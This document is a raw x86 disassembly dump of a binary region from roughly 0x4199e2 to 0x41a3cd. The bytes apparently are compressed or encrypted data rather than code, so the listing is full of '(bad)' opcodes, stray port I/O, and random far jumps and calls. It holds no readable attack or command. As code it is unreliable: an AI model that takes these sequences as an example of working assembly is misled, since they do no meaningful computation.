  4199e2:	jmp    0x4199bc
  4199e4:	sbb    eax,0xabe6ebe9
  4199e9:	push   cs
  4199ea:	pusha  
  4199eb:	push   edi
  4199ec:	in     al,0x9b
  4199ee:	and    esp,0x66
  4199f1:	gs ja  0x4199f2
  4199f4:	das    
  4199f5:	or     BYTE PTR [eax],0xb0
  4199f8:	sub    ebx,DWORD PTR [ebp+0x7c]
  4199fb:	add    al,dl
  4199fd:	(bad)  
  4199fe:	aas    
  4199ff:	clc    
  419a00:	add    al,0xd5
  419a02:	(bad)  [ebx-0x1b]
  419a05:	mov    ?,WORD PTR [edx-0x4becaa7f]
  419a0b:	xchg   ebp,eax
  419a0c:	dec    esi
  419a0d:	push   edi
  419a0e:	push   ecx
  419a0f:	pop    ss
	...
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x6a4bd4c2,cl
  419a83:	repnz ror BYTE PTR [edi],1
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	jmp    0x8723:0x4096876d
  419a93:	pushf  
  419a94:	dec    esi
  419a95:	xor    ah,BYTE PTR [esi]
  419a97:	call   0xf549:0x941cdd34
  419a9e:	dec    eax
  419a9f:	int3   
  419aa0:	(bad)  
  419aa1:	cmp    bh,dh
  419aa3:	sub    BYTE PTR [edi+0x481de840],0x25
  419aaa:	sahf   
  419aab:	adc    edi,DWORD PTR es:[edi]
  419aae:	xchg   ebx,eax
  419aaf:	sub    dh,BYTE PTR [edx-0x41]
  419ab2:	sub    eax,0xe34f20f4
  419ab7:	or     ecx,esi
  419ab9:	outs   dx,BYTE PTR ds:[esi]
  419aba:	sbb    dh,ah
  419abc:	icebp  
  419abd:	jl     0x419b1b
  419abf:	mov    dh,0xee
  419ac1:	sub    ebp,DWORD PTR [edx+0x5d]
  419ac4:	out    dx,eax
  419ac5:	fld    DWORD PTR [eax+0x51fd959a]
  419acb:	js     0x419aa2
  419acd:	xchg   ebp,eax
  419ace:	in     eax,dx
  419acf:	fwait
  419ad0:	fs int3 
  419ad2:	shl    BYTE PTR [ebx-0x54],1
  419ad5:	mov    BYTE PTR [ebx],dl
  419ad7:	mov    al,ds:0xa9357f7c
  419adc:	xchg   dh,al
  419ade:	xor    DWORD PTR [ecx],ebx
  419ae0:	inc    ebx
  419ae1:	xchg   ebp,eax
  419ae2:	out    dx,al
  419ae3:	int3   
  419ae4:	retf   0x9d8c
  419ae7:	ins    BYTE PTR es:[edi],dx
  419ae8:	add    eax,0xe81c44c9
  419aed:	cld    
  419aee:	dec    ecx
  419aef:	mov    dl,0x6d
  419af1:	xor    BYTE PTR [edx-0x21],dh
  419af4:	sub    al,0x6d
  419af6:	cmp    eax,0x4ba75545
  419afb:	dec    ecx
  419afc:	ss mov cl,0xd8
  419aff:	mov    esp,0x7780a840
  419b04:	in     al,dx
  419b05:	aaa    
  419b06:	jle    0x419b5e
  419b08:	clc    
  419b09:	adc    ebp,ecx
  419b0b:	mov    ds:0x58e3ae36,al
  419b10:	rcl    bl,1
  419b12:	lods   al,BYTE PTR ds:[esi]
  419b13:	dec    edi
  419b14:	push   0xffffffdc
  419b16:	call   0x82f8:0xd7917432
  419b1d:	fcomp  QWORD PTR [edi-0x4d]
  419b20:	imul   ebx,DWORD PTR [esi],0x43
  419b23:	aam    0x6b
  419b25:	stos   BYTE PTR es:[edi],al
  419b26:	and    eax,0x913235ca
  419b2b:	test   eax,0xc7fad57c
  419b30:	daa    
  419b31:	xchg   edi,eax
  419b32:	lds    edx,FWORD PTR [ecx]
  419b34:	and    bh,ah
  419b36:	clc    
  419b37:	lock xor dl,BYTE PTR [eax-0x1f]
  419b3b:	cmp    BYTE PTR [edi],ah
  419b3d:	rol    esi,0xd8
  419b40:	sti    
  419b41:	inc    eax
  419b42:	mov    al,ds:0x81fdc0a0
  419b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b48:	mov    dh,dh
  419b4a:	sub    DWORD PTR [edx+0x9],esi
  419b4d:	lods   eax,DWORD PTR ds:[esi]
  419b4e:	mov    ds:0x9589a3f2,eax
  419b53:	jns    0x419b1a
  419b55:	in     eax,dx
  419b56:	fistp  DWORD PTR [eax+eiz*8+0x64]
  419b5a:	cli    
  419b5b:	aas    
  419b5c:	inc    esi
  419b5d:	xchg   ebp,eax
  419b5e:	pushf  
  419b5f:	and    dl,bl
  419b61:	cwde   
  419b62:	add    eax,0x6b705832
  419b67:	ss add al,0xf4
  419b6a:	jl     0x419be4
  419b6c:	in     al,0xb5
  419b6e:	mov    edi,0xa1f8220b
  419b73:	int3   
  419b74:	mov    eax,0x32aa9fc6
  419b79:	pop    es
  419b7a:	jle    0x419bab
  419b7c:	sbb    DWORD PTR [edi+0x69],edx
  419b7f:	or     al,0xa3
  419b81:	lds    esi,FWORD PTR fs:[edi-0x441fbb26]
  419b88:	ja     0x419b52
  419b8a:	dec    esi
  419b8b:	das    
  419b8c:	mov    dh,0xce
  419b8e:	retf   
  419b8f:	mov    ds:0x0,al
	...
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x73
  419c01:	leave  
  419c02:	pushf  
  419c03:	stc    
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	mov    ds:0x141a9d69,al
  419c11:	(bad)  
  419c12:	pop    edi
  419c13:	sub    edx,ecx
  419c15:	xchg   ax,ax
  419c17:	call   0x362e1acb
  419c1c:	unpcklps xmm2,XMMWORD PTR [edi-0x39]
  419c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c21:	lods   al,BYTE PTR ds:[esi]
  419c22:	ds out 0x45,eax
  419c25:	adc    eax,0xb4351304
  419c2a:	js     0x419bd8
  419c2c:	sub    al,0x7d
  419c2e:	loopne 0x419bbf
  419c30:	(bad)  
  419c31:	sbb    eax,0x6c495426
  419c36:	ret    0xd785
  419c39:	dec    eax
  419c3a:	dec    ebx
  419c3b:	inc    esp
  419c3c:	cmp    al,0x69
  419c3e:	mov    bh,ch
  419c40:	pop    ss
  419c41:	inc    eax
  419c42:	dec    esi
  419c43:	dec    edx
  419c44:	(bad)  
  419c45:	rcr    DWORD PTR [edi],1
  419c47:	out    dx,al
  419c48:	push   esi
  419c49:	pop    es
  419c4a:	jnp    0x419bfe
  419c4c:	and    eax,0x12f94957
  419c51:	std    
  419c52:	mov    cl,0xb
  419c54:	pop    ss
  419c55:	test   eax,0x62e53d03
  419c5a:	cdq    
  419c5b:	fdiv   DWORD PTR [edi+0x600d45f3]
  419c61:	ss sti 
  419c63:	mov    al,ds:0x9809c3a3
  419c68:	in     eax,0xb3
  419c6a:	fdiv   st,st(0)
  419c6c:	stos   DWORD PTR es:[edi],eax
  419c6d:	sub    BYTE PTR [edi+0xd],0x2a
  419c71:	push   cs
  419c72:	loop   0x419c51
  419c74:	outs   dx,DWORD PTR ds:[esi]
  419c75:	add    BYTE PTR [esi-0x4a],0x15
  419c79:	popa   
  419c7a:	ins    BYTE PTR es:[edi],dx
  419c7b:	pop    edx
  419c7c:	mov    BYTE PTR [esi+0x2e],dl
  419c7f:	xor    cl,BYTE PTR [ebp+ecx*8-0x7f]
  419c83:	cmp    DWORD PTR [ebx],esp
  419c85:	sbb    BYTE PTR [edi-0x2fe89dbf],dh
  419c8b:	(bad)  
  419c8c:	ss in  eax,0xb8
  419c8f:	push   ds
  419c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c91:	mov    edx,0x2cb38a20
  419c96:	into   
  419c97:	mov    bh,0xee
  419c99:	imul   esp,DWORD PTR [ebx+0x1ca017b1],0xa5cfa9af
  419ca3:	ins    BYTE PTR es:[edi],dx
  419ca4:	inc    edi
  419ca5:	dec    eax
  419ca6:	push   ds
  419ca7:	mov    BYTE PTR [edi],0x8d
  419caa:	shl    DWORD PTR [ecx],cl
  419cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cad:	push   ss
  419cae:	xchg   edi,eax
  419caf:	xchg   esi,eax
  419cb0:	stc    
  419cb1:	push   DWORD PTR [ecx]
  419cb3:	(bad)  
  419cb4:	loopne 0x419cf5
  419cb6:	add    eax,0x67b6e583
  419cbb:	ret    0x314e
  419cbe:	(bad)  
  419cbf:	imul   edi,DWORD PTR [ecx-0x4f281e54],0x46b5e58c
  419cc9:	jb     0x419cad
  419ccb:	adc    bl,BYTE PTR [edi+0x7a]
  419cce:	(bad)  
  419ccf:	mov    ebp,0x53febd40
  419cd4:	jne    0x419c7b
  419cd6:	or     al,0xd8
  419cd8:	jle    0x419cbf
  419cda:	push   ds
  419cdb:	jge    0x419cc9
  419cdd:	add    DWORD PTR [edi+ecx*4],eax
  419ce0:	cwde   
  419ce1:	div    BYTE PTR ds:0xb30d43cb
  419ce7:	push   edx
  419ce8:	mov    ah,0xce
  419cea:	std    
  419ceb:	aam    0x8f
  419ced:	cmp    bh,BYTE PTR [edx+0x26]
  419cf0:	scas   eax,DWORD PTR es:[edi]
  419cf1:	jmp    0xd0ae:0xe1889922
  419cf8:	or     BYTE PTR [ebx],bl
  419cfa:	popa   
  419cfb:	push   ebx
  419cfc:	fstp   st(3)
  419cfe:	mov    dh,al
  419d00:	test   BYTE PTR [edx+0x264ef8b8],cl
  419d06:	xchg   DWORD PTR [edx-0x61],ebp
  419d09:	and    eax,0x35972ff4
  419d0e:	sub    eax,0x60
	...
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fidivr DWORD PTR ss:[edi-0x77]
  419d82:	stos   BYTE PTR es:[edi],al
  419d83:	pop    ecx
  419d84:	fcom   DWORD PTR [ecx]
  419d86:	add    DWORD PTR [eax],eax
  419d88:	add    al,0x1
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	cmp    ebp,DWORD PTR [edi]
  419d8e:	fistp  WORD PTR [ebx]
  419d90:	adc    bh,BYTE PTR [edi+0x7be1b2d8]
  419d96:	pop    esi
  419d97:	cmp    esp,DWORD PTR [eax+0x27dc92c]
  419d9d:	cmp    eax,0xb675311e
  419da2:	xor    BYTE PTR [esi+0x1be80d48],dl
  419da8:	jno    0x419e16
  419daa:	enter  0x2546,0x4e
  419dae:	jnp    0x419dcf
  419db0:	ins    BYTE PTR es:[edi],dx
  419db1:	pop    eax
  419db2:	and    BYTE PTR [ebp-0x15],dl
  419db5:	xor    edx,ebx
  419db7:	pop    es
  419db8:	div    DWORD PTR [ebp-0x17]
  419dbb:	mov    dl,BYTE PTR [edi-0x1692fe32]
  419dc1:	cmp    ebp,0xffffff90
  419dc4:	in     eax,0xac
  419dc6:	(bad)  
  419dc7:	mov    ebp,0xf126e79c
  419dcc:	pop    es
  419dcd:	inc    ebp
  419dce:	neg    edx
  419dd0:	xchg   ebx,eax
  419dd1:	out    dx,al
  419dd2:	mov    WORD PTR [esi-0x19],cs
  419dd5:	clc    
  419dd6:	mov    edx,0xae597a57
  419ddb:	xchg   esi,eax
  419ddc:	xor    ebp,edi
  419dde:	and    eax,0xeee7e541
  419de3:	ret    0x8208
  419de6:	cmp    DWORD PTR [eax+0x12],edx
  419de9:	xchg   ebp,eax
  419dea:	loop   0x419de0
  419dec:	outs   dx,DWORD PTR ds:[esi]
  419ded:	mov    al,cl
  419def:	push   eax
  419df0:	dec    ebp
  419df1:	cmc    
  419df2:	mov    esi,0x62caf780
  419df7:	push   ebx
  419df8:	jmp    0x7a80:0xf19815c2
  419dff:	pop    esp
  419e00:	mov    al,0x7a
  419e02:	mov    ch,0x60
  419e04:	push   cs
  419e05:	loopne 0x419ddf
  419e07:	in     al,dx
  419e08:	mov    WORD PTR [ebp+0x40094671],gs
  419e0e:	out    dx,al
  419e0f:	aam    0xda
  419e11:	push   edx
  419e12:	fcmove st,st(4)
  419e14:	popa   
  419e15:	out    0x8b,al
  419e17:	fs (bad) 
  419e19:	fstp   QWORD PTR [eax+0x1e]
  419e1c:	rcl    dl,1
  419e1e:	cmp    bh,cl
  419e20:	mov    bl,0xd5
  419e22:	cs (bad) 
  419e24:	retf   0x144c
  419e27:	mov    eax,0xcd9dabfd
  419e2c:	(bad)  
  419e2d:	in     eax,0x42
  419e2f:	xor    BYTE PTR [ecx-0x33e87029],0xc0
  419e36:	mov    ebp,0xe95e9e89
  419e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e3c:	and    eax,0x8577c404
  419e41:	fstp   QWORD PTR [eax-0x3fb9f3a2]
  419e47:	es aad 0x48
  419e4a:	fiadd  WORD PTR [bx+di-0x72]
  419e4e:	jl     0x419e04
  419e50:	jns    0x419e45
  419e52:	xlat   BYTE PTR ds:[ebx]
  419e53:	xor    ecx,DWORD PTR [ecx-0x7ac3bfe3]
  419e59:	inc    ebx
  419e5a:	das    
  419e5b:	xchg   edx,eax
  419e5c:	int3   
  419e5d:	cmc    
  419e5e:	leave  
  419e5f:	lock jmp DWORD PTR [esi]
  419e62:	mov    esp,0xbe054606
  419e68:	xchg   esi,eax
  419e69:	adc    ecx,DWORD PTR [ebx-0x6e42986b]
  419e6f:	inc    edi
  419e70:	and    eax,DWORD PTR [ebx+0xc4a4a89]
  419e76:	icebp  
  419e77:	sbb    esp,DWORD PTR [esi-0x62]
  419e7a:	mov    BYTE PTR [ebp-0x42],al
  419e7d:	fyl2xp1 
  419e7f:	push   edx
  419e80:	loop   0x419ee2
  419e82:	pop    ecx
  419e83:	pop    es
  419e84:	inc    ecx
  419e85:	hlt    
  419e86:	pop    ecx
  419e87:	repz fstp QWORD PTR [ecx]
  419e8a:	cli    
  419e8b:	(bad)  
  419e8c:	xor    al,0x41
  419e8e:	pop    esp
  419e8f:	mov    eax,0x0
	...
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	xlat   BYTE PTR ds:[ebx]
  419f01:	lock cmc 
  419f03:	aas    
  419f04:	fcom   QWORD PTR [edx]
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    al,0x1
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	idiv   DWORD PTR [edi+0x7a]
  419f0f:	arpl   WORD PTR [edx-0xc],bx
  419f12:	arpl   WORD PTR [ebp-0x31],di
  419f15:	jg     0x419ee3
  419f17:	xchg   edx,eax
  419f18:	dec    ecx
  419f19:	or     eax,0x878aea33
  419f1e:	(bad)  
  419f1f:	cmp    DWORD PTR [ebx],ecx
  419f21:	inc    ebx
  419f22:	push   ebx
  419f23:	sub    esi,ebp
  419f25:	ret    0x5e62
  419f28:	push   ss
  419f29:	jae    0x419eed
  419f2b:	sub    ebx,DWORD PTR [eax+0x53]
  419f2e:	call   0xcadc:0x94da47b7
  419f35:	faddp  st(1),st
  419f37:	inc    ebp
  419f38:	xor    BYTE PTR [ebx],al
  419f3a:	adc    BYTE PTR [edi+0x6b726bea],cl
  419f40:	dec    edx
  419f41:	fidivr DWORD PTR [ebp-0x3a]
  419f44:	or     ebp,ebp
  419f46:	popa   
  419f47:	or     DWORD PTR [ebp+ecx*1+0x51a5f61c],edx
  419f4e:	outs   dx,BYTE PTR ds:[esi]
  419f4f:	dec    esp
  419f50:	ds mov ecx,0x1bc68870
  419f56:	cs push ds
  419f58:	(bad)  
  419f59:	jo     0x419fa7
  419f5b:	sub    BYTE PTR [ebx],ah
  419f5d:	mov    eax,0x2e2ddeb9
  419f62:	sbb    al,0xee
  419f64:	and    al,0xf1
  419f66:	iret   
  419f67:	push   edx
  419f68:	inc    ebp
  419f69:	mul    DWORD PTR [edi]
  419f6b:	data16 jb 0x419f3b
  419f6e:	adc    al,0x5e
  419f70:	cmp    esi,esp
  419f72:	sbb    DWORD PTR [ecx-0x41],ebx
  419f75:	xchg   esi,eax
  419f76:	mov    WORD PTR [eax+0x30],cs
  419f79:	add    al,BYTE PTR [ecx]
  419f7b:	outs   dx,BYTE PTR ds:[esi]
  419f7c:	mov    eax,0x8a350bcc
  419f81:	cli    
  419f82:	add    BYTE PTR [eax+0x24],cl
  419f85:	iret   
  419f86:	fsubrp st(0),st
  419f88:	xchg   DWORD PTR [ebp-0x41],eax
  419f8b:	adc    bl,dl
  419f8d:	or     DWORD PTR [esi+0x7e],0x44a6fcb1
  419f94:	(bad)  
  419f95:	mov    eax,0x3d803797
  419f9a:	xchg   esi,eax
  419f9b:	dec    edi
  419f9c:	xlat   BYTE PTR ds:[ebx]
  419f9d:	adc    ch,BYTE PTR [esi]
  419f9f:	hlt    
  419fa0:	xor    al,0xc4
  419fa2:	dec    edi
  419fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fa4:	rol    DWORD PTR [ebp+0x42],1
  419fa7:	aam    0x79
  419fa9:	push   0x306b9510
  419fae:	dec    ebx
  419faf:	call   0xbe0e:0x98969fe7
  419fb6:	jge    0x419f67
  419fb8:	fs nop
  419fba:	in     eax,0x7a
  419fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fbd:	pop    ebx
  419fbe:	lock outs dx,BYTE PTR ss:[esi]
  419fc1:	dec    ebx
  419fc2:	pop    ss
  419fc3:	mov    ds:0x7bc65c23,al
  419fc8:	jp     0x419f5b
  419fca:	and    esp,ebp
  419fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fcd:	sti    
  419fce:	test   eax,0x12e0c08c
  419fd3:	sar    WORD PTR [edx],cl
  419fd6:	xchg   ebp,eax
  419fd7:	xchg   ebx,eax
  419fd8:	cmp    DWORD PTR [ebp+0x0],edx
  419fdb:	jmp    0x83ae:0xb8375ca5
  419fe2:	adc    ebp,DWORD PTR [ecx]
  419fe4:	jns    0x419f98
  419fe6:	ins    DWORD PTR es:[edi],dx
  419fe7:	es dec edx
  419fe9:	xchg   edi,eax
  419fea:	hlt    
  419feb:	cli    
  419fec:	repz cmp BYTE PTR [ecx+0x0],bl
  419ff0:	(bad)  
  419ff1:	jge    0x41a00f
  419ff3:	sti    
  419ff4:	(bad)  [ebx]
  419ff6:	and    al,0x98
  419ff8:	lods   eax,DWORD PTR ds:[esi]
  419ff9:	fcomp  DWORD PTR [eax+0x68]
  419ffc:	gs repz mov eax,0xd3bc4515
  41a003:	push   ecx
  41a004:	in     eax,0x86
  41a006:	or     ecx,DWORD PTR ds:0x4e13ed0e
  41a00c:	cwde   
  41a00d:	or     eax,0xf10a
	...
  41a072:	add    BYTE PTR [eax],al
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x40],bh
  41a081:	jbe    0x41a0ab
  41a083:	aam    0xe0
  41a085:	adc    eax,DWORD PTR [ecx]
  41a087:	add    BYTE PTR [ecx+eax*1],al
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	je     0x41a068
  41a08e:	or     DWORD PTR [ebx],edx
  41a090:	sub    eax,0x8a32b235
  41a095:	aad    0xa8
  41a097:	in     eax,dx
  41a098:	xchg   ecx,eax
  41a099:	dec    ebx
  41a09a:	xor    eax,0xe1c8d9da
  41a09f:	inc    ebp
  41a0a0:	pushf  
  41a0a1:	fsubp  st(0),st
  41a0a3:	shld   DWORD PTR [ebx],esp,0xd2
  41a0a7:	push   es
  41a0a8:	mov    al,ds:0xb2af94f
  41a0ad:	loop   0x41a06c
  41a0af:	pop    ebp
  41a0b0:	jg     0x41a0b5
  41a0b2:	fistp  DWORD PTR [ecx-0x70]
  41a0b5:	push   ebx
  41a0b6:	daa    
  41a0b7:	xor    BYTE PTR [esp+ecx*1],bh
  41a0ba:	loope  0x41a133
  41a0bc:	inc    esp
  41a0bd:	(bad)  
  41a0be:	cmp    DWORD PTR [esi],edi
  41a0c0:	mov    ah,0x33
  41a0c2:	pop    ss
  41a0c3:	mov    ebx,0x7f3d3beb
  41a0c8:	call   0x3146:0x1f9a34c4
  41a0cf:	dec    ecx
  41a0d0:	cli    
  41a0d1:	mov    BYTE PTR [esi+0x5d],bh
  41a0d4:	mov    dh,0x2f
  41a0d6:	lods   al,BYTE PTR ds:[esi]
  41a0d7:	or     al,0xa3
  41a0d9:	bound  esp,QWORD PTR ds:0x92dcf862
  41a0df:	adc    cl,dh
  41a0e1:	lods   eax,DWORD PTR ds:[esi]
  41a0e2:	stos   DWORD PTR es:[edi],eax
  41a0e3:	call   0xc9f9:0xa7548345
  41a0ea:	dec    ecx
  41a0eb:	iret   
  41a0ec:	test   al,0x19
  41a0ee:	shl    DWORD PTR [ecx+edi*1-0x312201fd],0xf9
  41a0f6:	clc    
  41a0f7:	rcr    BYTE PTR [edx],cl
  41a0f9:	jnp    0x41a0bc
  41a0fb:	outs   dx,DWORD PTR ds:[esi]
  41a0fc:	dec    ebp
  41a0fd:	mov    WORD PTR [ecx],ds
  41a0ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a100:	test   eax,0xba78f6b8
  41a105:	sub    dh,BYTE PTR [esi-0x375e19f2]
  41a10b:	push   edx
  41a10c:	dec    edi
  41a10d:	pop    ebp
  41a10e:	push   ecx
  41a10f:	dec    esi
  41a110:	stos   DWORD PTR es:[edi],eax
  41a111:	loopne 0x41a17d
  41a113:	das    
  41a114:	inc    edx
  41a115:	js     0x41a175
  41a117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a118:	pushf  
  41a119:	xchg   ecx,eax
  41a11a:	out    0xfa,al
  41a11c:	ret    
  41a11d:	loopne 0x41a0c1
  41a11f:	loope  0x41a0cd
  41a121:	mov    bh,0xc8
  41a123:	and    DWORD PTR [edx+0x5],ecx
  41a126:	stos   DWORD PTR es:[edi],eax
  41a127:	xor    edx,DWORD PTR [ebx-0x2875fad4]
  41a12d:	push   edx
  41a12e:	je     0x41a145
  41a130:	mov    esi,0x704623e8
  41a135:	cmp    ebx,edi
  41a137:	shl    DWORD PTR [ebx-0x2b79b459],0xd5
  41a13e:	xchg   dl,cl
  41a140:	sub    al,0xd2
  41a142:	(bad)  
  41a143:	in     eax,0xe2
  41a145:	jle    0x41a0ed
  41a147:	xchg   ecx,eax
  41a148:	mov    edx,0x83a4944e
  41a14d:	push   esi
  41a14e:	rcl    BYTE PTR cs:[ebx+edi*4],0x40
  41a153:	mov    esp,0x393dbc83
  41a158:	addr16 lahf 
  41a15a:	aas    
  41a15b:	test   BYTE PTR [eax+0x4c1ff926],0xa1
  41a162:	rcr    BYTE PTR [esi],0x63
  41a165:	in     eax,dx
  41a166:	and    dh,BYTE PTR [ebx]
  41a168:	or     eax,0xce03403b
  41a16d:	retf   0xb552
  41a170:	mov    ebp,0xef5c2bb2
  41a175:	call   0xc04c:0x5f5807df
  41a17c:	xchg   ebx,eax
  41a17d:	pop    ss
  41a17e:	ins    BYTE PTR es:[edi],dx
  41a17f:	lahf   
  41a180:	sub    ah,BYTE PTR [ecx-0x3b]
  41a183:	jmp    0x2550fe6f
  41a188:	ins    DWORD PTR es:[edi],dx
  41a189:	ret    0x66f5
  41a18c:	mov    ah,ch
  41a18e:	dec    esp
  41a18f:	rol    DWORD PTR [eax],cl
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	jmp    0xe4d46eae
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	lea    esi,fs:[edx+0x7ca3a2e]
  41a213:	in     eax,dx
  41a214:	popa   
  41a215:	add    al,0x1
  41a217:	fld    DWORD PTR [edi]
  41a219:	add    BYTE PTR [esp+ecx*4],0xae
  41a21d:	mov    ah,0xba
  41a21f:	fild   QWORD PTR ds:0x800dd72f
  41a225:	push   ecx
  41a226:	fcom   QWORD PTR [edx-0x2c]
  41a229:	test   ch,0x6b
  41a22c:	enter  0x1b0e,0xaf
  41a230:	add    al,0xe9
  41a232:	pusha  
  41a233:	jns    0x41a250
  41a235:	xor    eax,0xbeb16a
  41a23a:	mov    ds,esp
  41a23c:	(bad)  
  41a23d:	bound  ecx,QWORD PTR [esi-0x36]
  41a240:	push   cs
  41a241:	fidiv  DWORD PTR [ebp+ebp*2+0x1]
  41a245:	sbb    dl,ch
  41a247:	push   0xffffffea
  41a249:	mov    bh,0x4e
  41a24b:	jge    0x41a2b7
  41a24d:	mov    ebp,0xe904ba64
  41a252:	cmp    ch,BYTE PTR [edx+ebx*8-0x63]
  41a256:	popf   
  41a257:	jp     0x41a255
  41a259:	rol    esp,cl
  41a25b:	lock (bad) 
  41a25d:	pop    ss
  41a25e:	xlat   BYTE PTR ds:[ebx]
  41a25f:	jo     0x41a227
  41a261:	sbb    BYTE PTR [ecx+0xb],ch
  41a264:	and    ah,dh
  41a266:	xor    bl,BYTE PTR [ebx+0x9]
  41a269:	jmp    0x41a25f
  41a26b:	push   esp
  41a26c:	and    ecx,DWORD PTR [edi-0x7fd11f67]
  41a272:	clc    
  41a273:	bound  edx,QWORD PTR [eax+0x6a74619c]
  41a279:	arpl   WORD PTR [ebx+0x78],bx
  41a27c:	test   BYTE PTR [edx+edi*8+0xb7d2056],al
  41a283:	dec    ecx
  41a284:	and    eax,ebx
  41a286:	lock mov dh,bl
  41a289:	cmp    eax,0x39bbeb9b
  41a28e:	xchg   esi,eax
  41a28f:	or     bh,BYTE PTR ds:0xa83e29f9
  41a295:	in     al,0x5c
  41a297:	jl     0x41a2b4
  41a299:	and    al,0xfb
  41a29b:	or     esp,DWORD PTR [edi-0x11]
  41a29e:	ins    BYTE PTR es:[edi],dx
  41a29f:	in     al,dx
  41a2a0:	aam    0xae
  41a2a2:	jmp    0x65cb61fa
  41a2a7:	dec    edx
  41a2a8:	(bad)  
  41a2a9:	xchg   esp,eax
  41a2aa:	mov    WORD PTR [eax+0x483c4cb0],?
  41a2b0:	push   ebp
  41a2b1:	out    0x64,eax
  41a2b3:	lock out 0x43,al
  41a2b6:	out    0x6c,al
  41a2b8:	outs   dx,BYTE PTR ds:[esi]
  41a2b9:	sub    ebp,DWORD PTR [ebx+edx*4-0x2d]
  41a2bd:	loope  0x41a33d
  41a2bf:	js     0x41a297
  41a2c1:	(bad)  
  41a2c2:	push   ss
  41a2c3:	or     al,BYTE PTR [ecx+0x25]
  41a2c6:	mov    ah,0xad
  41a2c8:	pop    ds
  41a2c9:	sti    
  41a2ca:	into   
  41a2cb:	cmp    edx,0x4cf7fe76
  41a2d1:	or     edi,0x2a3424fa
  41a2d7:	adc    al,BYTE PTR [esi+0x63]
  41a2da:	inc    DWORD PTR [edi+ebp*4-0x2e71dd8f]
  41a2e1:	fld    DWORD PTR [ecx]
  41a2e3:	call   0x9d4b:0xc0b1f29b
  41a2ea:	stc    
  41a2eb:	test   eax,0x20eb584e
  41a2f0:	inc    ebx
  41a2f1:	cdq    
  41a2f2:	push   0x57
  41a2f4:	sbb    al,0x75
  41a2f6:	fidiv  WORD PTR ds:0x9c4df3c9
  41a2fc:	dec    esp
  41a2fd:	sub    eax,0x7e5114b9
  41a302:	push   ds
  41a303:	jmp    0x41a31a
  41a305:	sbb    edx,esp
  41a307:	(bad)  
  41a308:	adc    al,0x22
  41a30a:	test   BYTE PTR [ecx-0x33370010],ah
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	mov    ebp,0xe8954dac
  41a385:	adc    eax,0x1040001
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	lds    ebp,FWORD PTR [ebp+0x2fdbb827]
  41a392:	adc    BYTE PTR [eax-0x1f],cl
  41a395:	mov    WORD PTR [esi],es
  41a397:	inc    ecx
  41a398:	and    DWORD PTR [ebx+ebx*2-0x28],esp
  41a39c:	addr16 inc ebp
  41a39e:	int3   
  41a39f:	mov    WORD PTR [ebp+0x3cfa15da],ds
  41a3a5:	loop   0x41a410
  41a3a7:	dec    esi
  41a3a8:	icebp  
  41a3a9:	rcl    DWORD PTR [edi],cl
  41a3ab:	shl    DWORD PTR [ecx],cl
  41a3ad:	push   ecx
  41a3ae:	push   0xffffff90
  41a3b0:	adc    al,0x9f
  41a3b2:	es stos DWORD PTR es:[edi],eax
  41a3b4:	ja     0x41a431
  41a3b6:	mov    edx,0x58b41456
  41a3bb:	ss das 
  41a3bd:	inc    edx
  41a3be:	xchg   DWORD PTR [edi],ebp
  41a3c0:	mov    bh,BYTE PTR [edi+0x25]
  41a3c3:	std    
  41a3c4:	xor    esp,ebp
  41a3c6:	cld    
  41a3c7:	out    0xac,eax
  41a3c9:	xor    bl,dh
  41a3cb:	add    al,0xe6
  41a3cd:	les    edi,FWORD PTR [ebx-0x1aae24eb]
